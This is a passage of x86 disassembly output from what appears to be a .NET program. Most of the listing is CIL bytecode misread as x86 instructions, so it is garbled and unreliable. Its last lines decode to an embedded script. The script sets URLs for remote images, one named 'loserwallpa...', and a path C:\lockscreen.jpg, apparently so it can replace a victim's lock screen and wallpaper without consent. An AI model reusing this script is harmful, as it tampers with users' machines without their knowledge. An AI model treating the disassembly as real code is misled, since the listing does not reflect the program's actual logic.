  40453e:	f6 00 00             	testb  $0x0,(%eax)
  404541:	0a 25 13 07 2d ed    	or     0xed2d0713,%ah
  404547:	11 06                	adc    %eax,(%esi)
  404549:	6f                   	outsl  %ds:(%esi),(%dx)
  40454a:	f7 00 00 0a 73 f8    	testl  $0xf8730a00,(%eax)
  404550:	00 00                	add    %al,(%eax)
  404552:	0a 13                	or     (%ebx),%dl
  404554:	08 11                	or     %dl,(%ecx)
  404556:	08 11                	or     %dl,(%ecx)
  404558:	17                   	pop    %ss
  404559:	2d 0f 11 19 fe       	sub    $0xfe19110f,%eax
  40455e:	06                   	push   %es
  40455f:	7c 00                	jl     0x404561
  404561:	00 06                	add    %al,(%esi)
  404563:	73 f2                	jae    0x404557
  404565:	00 00                	add    %al,(%eax)
  404567:	0a 13                	or     (%ebx),%dl
  404569:	17                   	pop    %ss
  40456a:	11 17                	adc    %edx,(%edi)
  40456c:	6f                   	outsl  %ds:(%esi),(%dx)
  40456d:	f9                   	stc
  40456e:	00 00                	add    %al,(%eax)
  404570:	0a 16                	or     (%esi),%dl
  404572:	13 09                	adc    (%ecx),%ecx
  404574:	16                   	push   %ss
  404575:	13 0a                	adc    (%edx),%ecx
  404577:	02 13                	add    (%ebx),%dl
  404579:	1b 16                	sbb    (%esi),%edx
  40457b:	13 1c 38             	adc    (%eax,%edi,1),%ebx
  40457e:	c7 00 00 00 11 1b    	movl   $0x1b110000,(%eax)
  404584:	11 1c 9a             	adc    %ebx,(%edx,%ebx,4)
  404587:	13 0b                	adc    (%ebx),%ecx
  404589:	11 0b                	adc    %ecx,(%ebx)
  40458b:	72 7b                	jb     0x404608
  40458d:	02 00                	add    (%eax),%al
  40458f:	70 17                	jo     0x4045a8
  404591:	28 fa                	sub    %bh,%dl
  404593:	00 00                	add    %al,(%eax)
  404595:	0a 2d 07 17 0b 38    	or     0x380b1707,%ch
  40459b:	9e                   	sahf
  40459c:	00 00                	add    %al,(%eax)
  40459e:	00 11                	add    %dl,(%ecx)
  4045a0:	0b 72 87             	or     -0x79(%edx),%esi
  4045a3:	02 00                	add    (%eax),%al
  4045a5:	70 19                	jo     0x4045c0
  4045a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a8:	fb                   	sti
  4045a9:	00 00                	add    %al,(%eax)
  4045ab:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  4045ae:	11 0b                	adc    %ecx,(%ebx)
  4045b0:	17                   	pop    %ss
  4045b1:	8d 33                	lea    (%ebx),%esi
  4045b3:	00 00                	add    %al,(%eax)
  4045b5:	01 13                	add    %edx,(%ebx)
  4045b7:	1d 11 1d 16 72       	sbb    $0x72161d11,%eax
  4045bc:	99                   	cltd
  4045bd:	02 00                	add    (%eax),%al
  4045bf:	70 a2                	jo     0x404563
  4045c1:	11 1d 18 17 6f fc    	adc    %ebx,0xfc6f1718
  4045c7:	00 00                	add    %al,(%eax)
  4045c9:	0a 13                	or     (%ebx),%dl
  4045cb:	0c 11                	or     $0x11,%al
  4045cd:	0c 8e                	or     $0x8e,%al
  4045cf:	69 18 2e 20 72 9d    	imul   $0x9d72202e,(%eax),%ebx
  4045d5:	02 00                	add    (%eax),%al
  4045d7:	70 28                	jo     0x404601
  4045d9:	27                   	daa
  4045da:	00 00                	add    %al,(%eax)
  4045dc:	0a 6f 28             	or     0x28(%edi),%ch
  4045df:	00 00                	add    %al,(%eax)
  4045e1:	0a 16                	or     (%esi),%dl
  4045e3:	1f                   	pop    %ds
  4045e4:	10 28                	adc    %ch,(%eax)
  4045e6:	fd                   	std
  4045e7:	00 00                	add    %al,(%eax)
  4045e9:	0a 26                	or     (%esi),%ah
  4045eb:	17                   	pop    %ss
  4045ec:	13 1a                	adc    (%edx),%ebx
  4045ee:	dd 78 03             	fnstsw 0x3(%eax)
  4045f1:	00 00                	add    %al,(%eax)
  4045f3:	11 0c 17             	adc    %ecx,(%edi,%edx,1)
  4045f6:	9a 17 8d 62 00 00 01 	lcall  $0x100,$0x628d17
  4045fd:	13 1e                	adc    (%esi),%ebx
  4045ff:	11 1e                	adc    %ebx,(%esi)
  404601:	16                   	push   %ss
  404602:	1f                   	pop    %ds
  404603:	22 9d 11 1e 6f fe    	and    -0x190e1ef(%ebp),%bl
  404609:	00 00                	add    %al,(%eax)
  40460b:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40460e:	2e 11 0b             	adc    %ecx,%cs:(%ebx)
  404611:	72 7c                	jb     0x40468f
  404613:	03 00                	add    (%eax),%eax
  404615:	70 17                	jo     0x40462e
  404617:	28 fa                	sub    %bh,%dl
  404619:	00 00                	add    %al,(%eax)
  40461b:	0a 2d 08 11 0a 17    	or     0x170a1108,%ch
  404621:	58                   	pop    %eax
  404622:	13 09                	adc    (%ecx),%ecx
  404624:	2b 2e                	sub    (%esi),%ebp
  404626:	11 0b                	adc    %ecx,(%ebx)
  404628:	72 86                	jb     0x4045b0
  40462a:	03 00                	add    (%eax),%eax
  40462c:	70 17                	jo     0x404645
  40462e:	28 fa                	sub    %bh,%dl
  404630:	00 00                	add    %al,(%eax)
  404632:	0a 2d 08 28 ff 00    	or     0xff2808,%ch
  404638:	00 0a                	add    %cl,(%edx)
  40463a:	26 2b 17             	sub    %es:(%edi),%edx
  40463d:	11 0a                	adc    %ecx,(%edx)
  40463f:	17                   	pop    %ss
  404640:	58                   	pop    %eax
  404641:	13 0a                	adc    (%edx),%ecx
  404643:	11 1c 17             	adc    %ebx,(%edi,%edx,1)
  404646:	58                   	pop    %eax
  404647:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  40464a:	1c 11                	sbb    $0x11,%al
  40464c:	1b 8e 69 3f 2e ff    	sbb    -0xd1c097(%esi),%ecx
  404652:	ff                   	(bad)
  404653:	ff 28                	ljmp   *(%eax)
  404655:	46                   	inc    %esi
  404656:	00 00                	add    %al,(%eax)
  404658:	0a 13                	or     (%ebx),%dl
  40465a:	0d 11 0d 72 94       	or     $0x94720d11,%eax
  40465f:	03 00                	add    (%eax),%eax
  404661:	70 6f                	jo     0x4046d2
  404663:	00 01                	add    %al,(%ecx)
  404665:	00 0a                	add    %cl,(%edx)
  404667:	13 0e                	adc    (%esi),%ecx
  404669:	11 0e                	adc    %ecx,(%esi)
  40466b:	28 01                	sub    %al,(%ecx)
  40466d:	01 00                	add    %eax,(%eax)
  40466f:	0a 73 02             	or     0x2(%ebx),%dh
  404672:	01 00                	add    %eax,(%eax)
  404674:	0a 13                	or     (%ebx),%dl
  404676:	0f 11 0f             	movups %xmm1,(%edi)
  404679:	6f                   	outsl  %ds:(%esi),(%dx)
  40467a:	03 01                	add    (%ecx),%eax
  40467c:	00 0a                	add    %cl,(%edx)
  40467e:	13 10                	adc    (%eax),%edx
  404680:	08 28                	or     %ch,(%eax)
  404682:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  404687:	10 08                	adc    %cl,(%eax)
  404689:	11 10                	adc    %edx,(%eax)
  40468b:	28 04 01             	sub    %al,(%ecx,%eax,1)
  40468e:	00 0a                	add    %cl,(%edx)
  404690:	16                   	push   %ss
  404691:	13 1a                	adc    (%edx),%ebx
  404693:	dd d3                	fst    %st(3)
  404695:	02 00                	add    (%eax),%al
  404697:	00 11                	add    %dl,(%ecx)
  404699:	05 11 10 6f 05       	add    $0x56f1011,%eax
  40469e:	01 00                	add    %eax,(%eax)
  4046a0:	0a 26                	or     (%esi),%ah
  4046a2:	de 0c 11             	fimuls (%ecx,%edx,1)
  4046a5:	0f 2c 07             	cvttps2pi (%edi),%mm0
  4046a8:	11 0f                	adc    %ecx,(%edi)
  4046aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ab:	5e                   	pop    %esi
  4046ac:	00 00                	add    %al,(%eax)
  4046ae:	0a dc                	or     %ah,%bl
  4046b0:	de 0c 11             	fimuls (%ecx,%edx,1)
  4046b3:	0e                   	push   %cs
  4046b4:	2c 07                	sub    $0x7,%al
  4046b6:	11 0e                	adc    %ecx,(%esi)
  4046b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b9:	5e                   	pop    %esi
  4046ba:	00 00                	add    %al,(%eax)
  4046bc:	0a dc                	or     %ah,%bl
  4046be:	14 13                	adc    $0x13,%al
  4046c0:	11 72 be             	adc    %esi,-0x42(%edx)
  4046c3:	03 00                	add    (%eax),%eax
  4046c5:	70 73                	jo     0x40473a
  4046c7:	06                   	push   %es
  4046c8:	01 00                	add    %eax,(%eax)
  4046ca:	0a 13                	or     (%ebx),%dl
  4046cc:	12 11                	adc    (%ecx),%dl
  4046ce:	09 13                	or     %edx,(%ebx)
  4046d0:	13 38                	adc    (%eax),%edi
  4046d2:	ae                   	scas   %es:(%edi),%al
  4046d3:	01 00                	add    %eax,(%eax)
  4046d5:	00 11                	add    %dl,(%ecx)
  4046d7:	12 02                	adc    (%edx),%al
  4046d9:	11 13                	adc    %edx,(%ebx)
  4046db:	9a 6f 07 01 00 0a 13 	lcall  $0x130a,$0x1076f
  4046e2:	14 11                	adc    $0x11,%al
  4046e4:	14 6f                	adc    $0x6f,%al
  4046e6:	08 01                	or     %al,(%ecx)
  4046e8:	00 0a                	add    %cl,(%edx)
  4046ea:	39 6c 01 00          	cmp    %ebp,0x0(%ecx,%eax,1)
  4046ee:	00 11                	add    %dl,(%ecx)
  4046f0:	14 6f                	adc    $0x6f,%al
  4046f2:	09 01                	or     %eax,(%ecx)
  4046f4:	00 0a                	add    %cl,(%edx)
  4046f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4046f7:	0a 01                	or     (%ecx),%al
  4046f9:	00 0a                	add    %cl,(%edx)
  4046fb:	19 40 5a             	sbb    %eax,0x5a(%eax)
  4046fe:	01 00                	add    %eax,(%eax)
  404700:	00 02                	add    %al,(%edx)
  404702:	11 13                	adc    %edx,(%ebx)
  404704:	9a 12 15 28 0b 01 00 	lcall  $0x1,$0xb281512
  40470b:	0a 3a                	or     (%edx),%bh
  40470d:	4a                   	dec    %edx
  40470e:	01 00                	add    %eax,(%eax)
  404710:	00 11                	add    %dl,(%ecx)
  404712:	11 2c 0a             	adc    %ebp,(%edx,%ecx,1)
  404715:	11 05 11 11 6f 0c    	adc    %eax,0xc6f1111
  40471b:	01 00                	add    %eax,(%eax)
  40471d:	0a 26                	or     (%esi),%ah
  40471f:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  404722:	09 01                	or     %eax,(%ecx)
  404724:	00 0a                	add    %cl,(%edx)
  404726:	18 6f 0d             	sbb    %ch,0xd(%edi)
  404729:	01 00                	add    %eax,(%eax)
  40472b:	0a 6f 0e             	or     0xe(%edi),%ch
  40472e:	01 00                	add    %eax,(%eax)
  404730:	0a 6f 0f             	or     0xf(%edi),%ch
  404733:	01 00                	add    %eax,(%eax)
  404735:	0a 72 01             	or     0x1(%edx),%dh
  404738:	00 00                	add    %al,(%eax)
  40473a:	70 28                	jo     0x404764
  40473c:	c3                   	ret
  40473d:	00 00                	add    %al,(%eax)
  40473f:	0a 2c 19             	or     (%ecx,%ebx,1),%ch
  404742:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  404745:	09 01                	or     %eax,(%ecx)
  404747:	00 0a                	add    %cl,(%edx)
  404749:	17                   	pop    %ss
  40474a:	6f                   	outsl  %ds:(%esi),(%dx)
  40474b:	0d 01 00 0a 6f       	or     $0x6f0a0001,%eax
  404750:	0e                   	push   %cs
  404751:	01 00                	add    %eax,(%eax)
  404753:	0a 13                	or     (%ebx),%dl
  404755:	11 38                	adc    %edi,(%eax)
  404757:	23 01                	and    (%ecx),%eax
  404759:	00 00                	add    %al,(%eax)
  40475b:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  40475e:	09 01                	or     %eax,(%ecx)
  404760:	00 0a                	add    %cl,(%edx)
  404762:	18 6f 0d             	sbb    %ch,0xd(%edi)
  404765:	01 00                	add    %eax,(%eax)
  404767:	0a 6f 0e             	or     0xe(%edi),%ch
  40476a:	01 00                	add    %eax,(%eax)
  40476c:	0a 72 ee             	or     -0x12(%edx),%dh
  40476f:	03 00                	add    (%eax),%eax
  404771:	70 28                	jo     0x40479b
  404773:	c3                   	ret
  404774:	00 00                	add    %al,(%eax)
  404776:	0a 2d 23 11 14 6f    	or     0x6f141123,%ch
  40477c:	09 01                	or     %eax,(%ecx)
  40477e:	00 0a                	add    %cl,(%edx)
  404780:	18 6f 0d             	sbb    %ch,0xd(%edi)
  404783:	01 00                	add    %eax,(%eax)
  404785:	0a 6f 0e             	or     0xe(%edi),%ch
  404788:	01 00                	add    %eax,(%eax)
  40478a:	0a 6f 10             	or     0x10(%edi),%ch
  40478d:	01 00                	add    %eax,(%eax)
  40478f:	0a 72 f8             	or     -0x8(%edx),%dh
  404792:	03 00                	add    (%eax),%eax
  404794:	70 28                	jo     0x4047be
  404796:	c3                   	ret
  404797:	00 00                	add    %al,(%eax)
  404799:	0a 2c 28             	or     (%eax,%ebp,1),%ch
  40479c:	11 05 11 14 6f 09    	adc    %eax,0x96f1411
  4047a2:	01 00                	add    %eax,(%eax)
  4047a4:	0a 17                	or     (%edi),%dl
  4047a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a7:	0d 01 00 0a 6f       	or     $0x6f0a0001,%eax
  4047ac:	0e                   	push   %cs
  4047ad:	01 00                	add    %eax,(%eax)
  4047af:	0a 17                	or     (%edi),%dl
  4047b1:	8c 8d 00 00 01 6f    	mov    %cs,0x6f010000(%ebp)
  4047b7:	11 01                	adc    %eax,(%ecx)
  4047b9:	00 0a                	add    %cl,(%edx)
  4047bb:	26 14 13             	es adc $0x13,%al
  4047be:	11 38                	adc    %edi,(%eax)
  4047c0:	ba 00 00 00 11       	mov    $0x11000000,%edx
  4047c5:	14 6f                	adc    $0x6f,%al
  4047c7:	09 01                	or     %eax,(%ecx)
  4047c9:	00 0a                	add    %cl,(%edx)
  4047cb:	18 6f 0d             	sbb    %ch,0xd(%edi)
  4047ce:	01 00                	add    %eax,(%eax)
  4047d0:	0a 6f 0e             	or     0xe(%edi),%ch
  4047d3:	01 00                	add    %eax,(%eax)
  4047d5:	0a 72 04             	or     0x4(%edx),%dh
  4047d8:	04 00                	add    $0x0,%al
  4047da:	70 28                	jo     0x404804
  4047dc:	c3                   	ret
  4047dd:	00 00                	add    %al,(%eax)
  4047df:	0a 2d 23 11 14 6f    	or     0x6f141123,%ch
  4047e5:	09 01                	or     %eax,(%ecx)
  4047e7:	00 0a                	add    %cl,(%edx)
  4047e9:	18 6f 0d             	sbb    %ch,0xd(%edi)
  4047ec:	01 00                	add    %eax,(%eax)
  4047ee:	0a 6f 0e             	or     0xe(%edi),%ch
  4047f1:	01 00                	add    %eax,(%eax)
  4047f3:	0a 6f 10             	or     0x10(%edi),%ch
  4047f6:	01 00                	add    %eax,(%eax)
  4047f8:	0a 72 10             	or     0x10(%edx),%dh
  4047fb:	04 00                	add    $0x0,%al
  4047fd:	70 28                	jo     0x404827
  4047ff:	c3                   	ret
  404800:	00 00                	add    %al,(%eax)
  404802:	0a 2c 25 11 05 11 14 	or     0x14110511(,%eiz,1),%ch
  404809:	6f                   	outsl  %ds:(%esi),(%dx)
  40480a:	09 01                	or     %eax,(%ecx)
  40480c:	00 0a                	add    %cl,(%edx)
  40480e:	17                   	pop    %ss
  40480f:	6f                   	outsl  %ds:(%esi),(%dx)
  404810:	0d 01 00 0a 6f       	or     $0x6f0a0001,%eax
  404815:	0e                   	push   %cs
  404816:	01 00                	add    %eax,(%eax)
  404818:	0a 16                	or     (%esi),%dl
  40481a:	8c 8d 00 00 01 6f    	mov    %cs,0x6f010000(%ebp)
  404820:	11 01                	adc    %eax,(%ecx)
  404822:	00 0a                	add    %cl,(%edx)
  404824:	26 14 13             	es adc $0x13,%al
  404827:	11 2b                	adc    %ebp,(%ebx)
  404829:	54                   	push   %esp
  40482a:	11 05 11 14 6f 09    	adc    %eax,0x96f1411
  404830:	01 00                	add    %eax,(%eax)
  404832:	0a 17                	or     (%edi),%dl
  404834:	6f                   	outsl  %ds:(%esi),(%dx)
  404835:	0d 01 00 0a 6f       	or     $0x6f0a0001,%eax
  40483a:	0e                   	push   %cs
  40483b:	01 00                	add    %eax,(%eax)
  40483d:	0a 11                	or     (%ecx),%dl
  40483f:	14 6f                	adc    $0x6f,%al
  404841:	09 01                	or     %eax,(%ecx)
  404843:	00 0a                	add    %cl,(%edx)
  404845:	18 6f 0d             	sbb    %ch,0xd(%edi)
  404848:	01 00                	add    %eax,(%eax)
  40484a:	0a 6f 0e             	or     0xe(%edi),%ch
  40484d:	01 00                	add    %eax,(%eax)
  40484f:	0a 6f 11             	or     0x11(%edi),%ch
  404852:	01 00                	add    %eax,(%eax)
  404854:	0a 26                	or     (%esi),%ah
  404856:	14 13                	adc    $0x13,%al
  404858:	11 2b                	adc    %ebp,(%ebx)
  40485a:	23 11                	and    (%ecx),%edx
  40485c:	11 2c 13             	adc    %ebp,(%ebx,%edx,1)
  40485f:	11 05 11 11 02 11    	adc    %eax,0x11021111
  404865:	13 9a 6f 11 01 00    	adc    0x1116f(%edx),%ebx
  40486b:	0a 26                	or     (%esi),%ah
  40486d:	14 13                	adc    $0x13,%al
  40486f:	11 2b                	adc    %ebp,(%ebx)
  404871:	0c 11                	or     $0x11,%al
  404873:	05 02 11 13 9a       	add    $0x9a131102,%eax
  404878:	6f                   	outsl  %ds:(%esi),(%dx)
  404879:	12 01                	adc    (%ecx),%al
  40487b:	00 0a                	add    %cl,(%edx)
  40487d:	26 11 13             	adc    %edx,%es:(%ebx)
  404880:	17                   	pop    %ss
  404881:	58                   	pop    %eax
  404882:	13 13                	adc    (%ebx),%edx
  404884:	11 13                	adc    %edx,(%ebx)
  404886:	02 8e 69 3f 48 fe    	add    -0x1b7c097(%esi),%cl
  40488c:	ff                   	(bad)
  40488d:	ff 11                	call   *(%ecx)
  40488f:	11 2c 0a             	adc    %ebp,(%edx,%ecx,1)
  404892:	11 05 11 11 6f 0c    	adc    %eax,0xc6f1111
  404898:	01 00                	add    %eax,(%eax)
  40489a:	0a 26                	or     (%esi),%ah
  40489c:	11 05 72 1e 04 00    	adc    %eax,0x41e72
  4048a2:	70 6f                	jo     0x404913
  4048a4:	13 01                	adc    (%ecx),%eax
  4048a6:	00 0a                	add    %cl,(%edx)
  4048a8:	26 11 05 72 34 04 00 	adc    %eax,%es:0x43472
  4048af:	70 6f                	jo     0x404920
  4048b1:	0c 01                	or     $0x1,%al
  4048b3:	00 0a                	add    %cl,(%edx)
  4048b5:	26 11 05 11 06 11 08 	adc    %eax,%es:0x8110611
  4048bc:	14 11                	adc    $0x11,%al
  4048be:	18 2d 0f 11 19 fe    	sbb    %ch,0xfe19110f
  4048c4:	06                   	push   %es
  4048c5:	7d 00                	jge    0x4048c7
  4048c7:	00 06                	add    %al,(%esi)
  4048c9:	73 14                	jae    0x4048df
  4048cb:	01 00                	add    %eax,(%eax)
  4048cd:	0a 13                	or     (%ebx),%dl
  4048cf:	18 11                	sbb    %dl,(%ecx)
  4048d1:	18 14 6f             	sbb    %dl,(%edi,%ebp,2)
  4048d4:	02 00                	add    (%eax),%al
  4048d6:	00 2b                	add    %ch,(%ebx)
  4048d8:	26 06                	es push %es
  4048da:	6f                   	outsl  %ds:(%esi),(%dx)
  4048db:	73 00                	jae    0x4048dd
  4048dd:	00 06                	add    %al,(%esi)
  4048df:	2d 10 11 19 7b       	sub    $0x7b191110,%eax
  4048e4:	59                   	pop    %ecx
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	04 1f                	add    $0x1f,%al
  4048e9:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048eb:	16                   	push   %ss
  4048ec:	01 00                	add    %eax,(%eax)
  4048ee:	0a 2c e8             	or     (%eax,%ebp,8),%ch
  4048f1:	11 05 6f 17 01 00    	adc    %eax,0x1176f
  4048f7:	0a 11                	or     (%ecx),%dl
  4048f9:	05 6f 18 01 00       	add    $0x1186f,%eax
  4048fe:	0a 6f 19             	or     0x19(%edi),%ch
  404901:	01 00                	add    %eax,(%eax)
  404903:	0a 1b                	or     (%ebx),%bl
  404905:	33 1d 11 19 7b 58    	xor    0x587b1911,%ebx
  40490b:	00 00                	add    %al,(%eax)
  40490d:	04 11                	add    $0x11,%al
  40490f:	05 6f 18 01 00       	add    $0x1186f,%eax
  404914:	0a 6f 1a             	or     0x1a(%edi),%ch
  404917:	01 00                	add    %eax,(%eax)
  404919:	0a 6f e2             	or     -0x1e(%edi),%ch
  40491c:	00 00                	add    %al,(%eax)
  40491e:	0a 6f e3             	or     -0x1d(%edi),%ch
  404921:	00 00                	add    %al,(%eax)
  404923:	0a de                	or     %dh,%bl
  404925:	0c 11                	or     $0x11,%al
  404927:	05 2c 07 11 05       	add    $0x511072c,%eax
  40492c:	6f                   	outsl  %ds:(%esi),(%dx)
  40492d:	5e                   	pop    %esi
  40492e:	00 00                	add    %al,(%eax)
  404930:	0a dc                	or     %ah,%bl
  404932:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404935:	1b 01                	sbb    (%ecx),%eax
  404937:	00 0a                	add    %cl,(%edx)
  404939:	de 0c 11             	fimuls (%ecx,%edx,1)
  40493c:	04 2c                	add    $0x2c,%al
  40493e:	07                   	pop    %es
  40493f:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404942:	5e                   	pop    %esi
  404943:	00 00                	add    %al,(%eax)
  404945:	0a dc                	or     %ah,%bl
  404947:	de 03                	fiadds (%ebx)
  404949:	26 de 00             	fiadds %es:(%eax)
  40494c:	07                   	pop    %es
  40494d:	2c 15                	sub    $0x15,%al
  40494f:	72 42                	jb     0x404993
  404951:	04 00                	add    $0x0,%al
  404953:	70 28                	jo     0x40497d
  404955:	27                   	daa
  404956:	00 00                	add    %al,(%eax)
  404958:	0a 6f 28             	or     0x28(%edi),%ch
  40495b:	00 00                	add    %al,(%eax)
  40495d:	0a 28                	or     (%eax),%ch
  40495f:	aa                   	stos   %al,%es:(%edi)
  404960:	00 00                	add    %al,(%eax)
  404962:	0a 26                	or     (%esi),%ah
  404964:	06                   	push   %es
  404965:	6f                   	outsl  %ds:(%esi),(%dx)
  404966:	75 00                	jne    0x404968
  404968:	00 06                	add    %al,(%esi)
  40496a:	2a 11                	sub    (%ecx),%dl
  40496c:	1a 2a                	sbb    (%edx),%ch
  40496e:	00 00                	add    %al,(%eax)
  404970:	41                   	inc    %ecx
  404971:	7c 00                	jl     0x404973
  404973:	00 02                	add    %al,(%edx)
  404975:	00 00                	add    %al,(%eax)
  404977:	00 07                	add    %al,(%edi)
  404979:	02 00                	add    (%eax),%al
  40497b:	00 2d 00 00 00 34    	add    %ch,0x34000000
  404981:	02 00                	add    (%eax),%al
  404983:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404986:	00 00                	add    %al,(%eax)
  404988:	00 00                	add    %al,(%eax)
  40498a:	00 00                	add    %al,(%eax)
  40498c:	02 00                	add    (%eax),%al
  40498e:	00 00                	add    %al,(%eax)
  404990:	f9                   	stc
  404991:	01 00                	add    %eax,(%eax)
  404993:	00 49 00             	add    %cl,0x0(%ecx)
  404996:	00 00                	add    %al,(%eax)
  404998:	42                   	inc    %edx
  404999:	02 00                	add    (%eax),%al
  40499b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40499e:	00 00                	add    %al,(%eax)
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 00                	add    %al,(%eax)
  4049a4:	02 00                	add    (%eax),%al
  4049a6:	00 00                	add    %al,(%eax)
  4049a8:	7e 00                	jle    0x4049aa
  4049aa:	00 00                	add    %al,(%eax)
  4049ac:	38 04 00             	cmp    %al,(%eax,%eax,1)
  4049af:	00 b6 04 00 00 0c    	add    %dh,0xc000004(%esi)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	00 00                	add    %al,(%eax)
  4049b9:	00 00                	add    %al,(%eax)
  4049bb:	00 02                	add    %al,(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	00 68 00             	add    %ch,0x0(%eax)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	63 04 00             	arpl   %eax,(%eax,%eax,1)
  4049c7:	00 cb                	add    %cl,%bl
  4049c9:	04 00                	add    $0x0,%al
  4049cb:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4049d6:	00 00                	add    %al,(%eax)
  4049d8:	60                   	pusha
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	00 79 04             	add    %bh,0x4(%ecx)
  4049de:	00 00                	add    %al,(%eax)
  4049e0:	d9 04 00             	flds   (%eax,%eax,1)
  4049e3:	00 03                	add    %al,(%ebx)
  4049e5:	00 00                	add    %al,(%eax)
  4049e7:	00 69 00             	add    %ch,0x0(%ecx)
  4049ea:	00 01                	add    %al,(%ecx)
  4049ec:	6a 72                	push   $0x72
  4049ee:	6a 04                	push   $0x4
  4049f0:	00 70 28             	add    %dh,0x28(%eax)
  4049f3:	27                   	daa
  4049f4:	00 00                	add    %al,(%eax)
  4049f6:	0a 6f 28             	or     0x28(%edi),%ch
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	0a 28                	or     (%eax),%ch
  4049fd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	0a 73 1c             	or     0x1c(%ebx),%dh
  404a03:	01 00                	add    %eax,(%eax)
  404a05:	0a 7a 1e             	or     0x1e(%edx),%bh
  404a08:	02 28                	add    (%eax),%ch
  404a0a:	11 00                	adc    %eax,(%eax)
  404a0c:	00 0a                	add    %cl,(%edx)
  404a0e:	2a 00                	sub    (%eax),%al
  404a10:	e9 0c 00 00 24       	jmp    0x24404a21
  404a15:	6c                   	insb   (%dx),%es:(%edi)
  404a16:	6f                   	outsl  %ds:(%esi),(%dx)
  404a17:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404a1a:	6d                   	insl   (%dx),%es:(%edi)
  404a1b:	61                   	popa
  404a1c:	67 65 55             	addr16 gs push %ebp
  404a1f:	72 6c                	jb     0x404a8d
  404a21:	20 3d 20 22 68 74    	and    %bh,0x74682220
  404a27:	74 70                	je     0x404a99
  404a29:	73 3a                	jae    0x404a65
  404a2b:	2f                   	das
  404a2c:	2f                   	das
  404a2d:	69 6d 67 34 2e 67 65 	imul   $0x65672e34,0x67(%ebp),%ebp
  404a34:	6c                   	insb   (%dx),%es:(%edi)
  404a35:	62 6f 6f             	bound  %ebp,0x6f(%edi)
  404a38:	72 75                	jb     0x404aaf
  404a3a:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  404a3e:	2f                   	das
  404a3f:	2f                   	das
  404a40:	69 6d 61 67 65 73 2f 	imul   $0x2f736567,0x61(%ebp),%ebp
  404a47:	66 32 2f             	data16 xor (%edi),%ch
  404a4a:	30 38                	xor    %bh,(%eax)
  404a4c:	2f                   	das
  404a4d:	66 32 30             	data16 xor (%eax),%dh
  404a50:	38 64 65 33          	cmp    %ah,0x33(%ebp,%eiz,2)
  404a54:	35 62 35 64 36       	xor    $0x36643562,%eax
  404a59:	64 65 66 30 33       	fs data16 xor %dh,%gs:(%ebx)
  404a5e:	35 63 64 63 39       	xor    $0x39636463,%eax
  404a63:	33 30                	xor    (%eax),%esi
  404a65:	39 38                	cmp    %edi,(%eax)
  404a67:	63 38                	arpl   %edi,(%eax)
  404a69:	62 30                	bound  %esi,(%eax)
  404a6b:	66 35 2e 6a          	xor    $0x6a2e,%ax
  404a6f:	70 65                	jo     0x404ad6
  404a71:	67 22 0d             	and    (%di),%cl
  404a74:	0a 24 6c             	or     (%esp,%ebp,2),%ah
  404a77:	6f                   	outsl  %ds:(%esi),(%dx)
  404a78:	63 6b 64             	arpl   %ebp,0x64(%ebx)
  404a7b:	65 73 74             	gs jae 0x404af2
  404a7e:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  404a85:	50                   	push   %eax
  404a86:	61                   	popa
  404a87:	74 68                	je     0x404af1
  404a89:	20 3d 20 22 43 3a    	and    %bh,0x3a432220
  404a8f:	5c                   	pop    %esp
  404a90:	6c                   	insb   (%dx),%es:(%edi)
  404a91:	6f                   	outsl  %ds:(%esi),(%dx)
  404a92:	63 6b 73             	arpl   %ebp,0x73(%ebx)
  404a95:	63 72 65             	arpl   %esi,0x65(%edx)
  404a98:	65 6e                	outsb  %gs:(%esi),(%dx)
  404a9a:	2e 6a 70             	cs push $0x70
  404a9d:	67 22 0d             	and    (%di),%cl
  404aa0:	0a 0d 0a 24 77 61    	or     0x6177240a,%cl
  404aa6:	6c                   	insb   (%dx),%es:(%edi)
  404aa7:	6c                   	insb   (%dx),%es:(%edi)
  404aa8:	69 6d 61 67 65 55 72 	imul   $0x72556567,0x61(%ebp),%ebp
  404aaf:	6c                   	insb   (%dx),%es:(%edi)
  404ab0:	20 3d 20 22 68 74    	and    %bh,0x74682220
  404ab6:	74 70                	je     0x404b28
  404ab8:	73 3a                	jae    0x404af4
  404aba:	2f                   	das
  404abb:	2f                   	das
  404abc:	69 2e 69 62 62 2e    	imul   $0x2e626269,(%esi),%ebp
  404ac2:	63 6f 2f             	arpl   %ebp,0x2f(%edi)
  404ac5:	67 62 46 78          	bound  %eax,0x78(%bp)
  404ac9:	54                   	push   %esp
  404aca:	7a 30                	jp     0x404afc
  404acc:	47                   	inc    %edi
  404acd:	2f                   	das
  404ace:	6c                   	insb   (%dx),%es:(%edi)
  404acf:	6f                   	outsl  %ds:(%esi),(%dx)
  404ad0:	73 65                	jae    0x404b37
  404ad2:	72 77                	jb     0x404b4b
  404ad4:	61                   	popa
  404ad5:	6c                   	insb   (%dx),%es:(%edi)
  404ad6:	6c                   	insb   (%dx),%es:(%edi)
  404ad7:	70 61                	jo     0x404b3a
